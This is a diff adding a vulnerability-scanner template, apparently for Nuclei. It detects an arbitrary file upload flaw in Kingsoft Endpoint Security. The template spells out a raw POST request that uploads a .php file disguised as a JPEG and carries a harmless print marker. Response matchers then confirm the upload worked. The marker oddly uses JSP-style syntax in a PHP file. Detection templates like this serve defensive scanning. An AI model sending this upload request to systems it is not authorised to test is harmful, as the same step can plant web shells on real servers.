@@ -1,0 +1,38 @@
+id: kingsoft-zdaq-file-upload
+
+info:
+  name: Kingsoft Endpoint Security Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-upload
+
+http:
+  - raw:
+      - |
+        POST /tools/manage/upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCmFouLjmLS7D4iZr
+
+        ------WebKitFormBoundaryCmFouLjmLS7D4iZr
+        Content-Disposition: form-data; name="file"; filename="4bbc9855ce373d60847521589b287ced.php"
+        Content-Type: image/jpeg
+
+        <%out.print(1237);%>
+        ------WebKitFormBoundaryCmFouLjmLS7D4iZr--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "successfully"
+        part: body
+      - type: word
+        words:
+          - "[name] => 4bbc9855ce373d60847521589b287ced.php"
+        part: body
+      - type: word
+        words:
+          - "text/html; charset=UTF-8"
+        part: header
